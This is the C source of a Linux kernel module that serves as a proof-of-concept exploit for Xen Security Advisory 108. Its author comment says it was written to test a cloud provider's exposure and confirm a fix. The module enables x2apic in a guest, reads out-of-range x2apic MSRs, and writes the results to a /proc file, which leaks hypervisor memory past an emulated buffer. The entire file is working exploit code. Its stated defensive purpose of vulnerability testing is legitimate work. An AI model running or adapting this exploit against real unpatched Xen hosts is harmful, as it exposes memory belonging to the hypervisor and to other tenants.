/*
 * Xen SA 108 -- x2apic access past end of buffer exploit.
 *
 * This was developed as a PoC to see how vulnerable Rackspace was
 * before we patched, as well as to verify the fix.
 *
 * - comstud
 *
 */
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>


#define XSA108_MOD_NAME "xensa108"
#define XSA108_PROC_ENTRY "xensa108"

static u64 _x2apic_read(int reg)
{
    u64    val;

    rdmsrl(APIC_BASE_MSR + reg, val);
    return val;
}

static int _x2apic_init(void)
{
    u64 msr;

    rdmsrl(MSR_IA32_APICBASE, msr);
    if (msr & X2APIC_ENABLE)
    {
        printk(KERN_INFO "%s: x2apic found enabled on 2nd check\n",
               XSA108_MOD_NAME);
        return 0;
    }
    
    wrmsrl(MSR_IA32_APICBASE, msr | X2APIC_ENABLE);
    rdmsrl(MSR_IA32_APICBASE, msr);

    if (msr & X2APIC_ENABLE)
    {
        printk(KERN_INFO "%s: x2apic enabled\n", XSA108_MOD_NAME);
        return 0;
    }

    printk(KERN_INFO "%s: x2apic enable seemed to fail\n", XSA108_MOD_NAME);
    return 1;
}

static int _xensa108_fill(struct seq_file *m, void *v)
{
    int i;
    u32 *buf = kmalloc(768 * sizeof(u32), GFP_KERNEL);

    if (buf == NULL)
    {
       return 0;
    }

    printk("%s: reading x2apic msrs 256-1023\n", XSA108_MOD_NAME);

    /* Note: the xen msr_read code always returns
     * the upper 32bits as 0s, except for ISC. The upper
     * bits never come from the buffer that is overrun, so
     * we'll just drop those.
     */
    for(i=0;i<768;i++)
    {
        buf[i] = _x2apic_read(i + 256) & 0xffffffff;
    }

    seq_write(m, (char *)buf, 768 * sizeof(u32));

    kfree(buf);

    return 0;
}

static int _xensa108_open(struct inode *inode, struct file *file)
{
    return single_open(file, _xensa108_fill, NULL);
}

static const struct file_operations _xensa108_fops = {
    .owner      = THIS_MODULE,
    .open       = _xensa108_open,
    .read       = seq_read,
    .llseek     = seq_lseek,
    .release    = single_release,
};

int init_module(void)
{
    printk("%s: loading\n", XSA108_MOD_NAME);
    if (!x2apic_enabled())
    {
        printk("%s: Attempting to enable x2apic..\n", XSA108_MOD_NAME);
        if (_x2apic_init())
        {
            return -EFAULT;
        }
    }
    else
    {
        printk("%s: x2apic found already enabled\n", XSA108_MOD_NAME);
    }

    proc_create(XSA108_PROC_ENTRY, 0, NULL, &_xensa108_fops);
    printk("%s: loaded\n", XSA108_MOD_NAME);
    return 0;
}

void cleanup_module(void)
{
    printk(KERN_INFO "%s: unloading\n", XSA108_MOD_NAME);
    remove_proc_entry(XSA108_PROC_ENTRY, NULL);
}
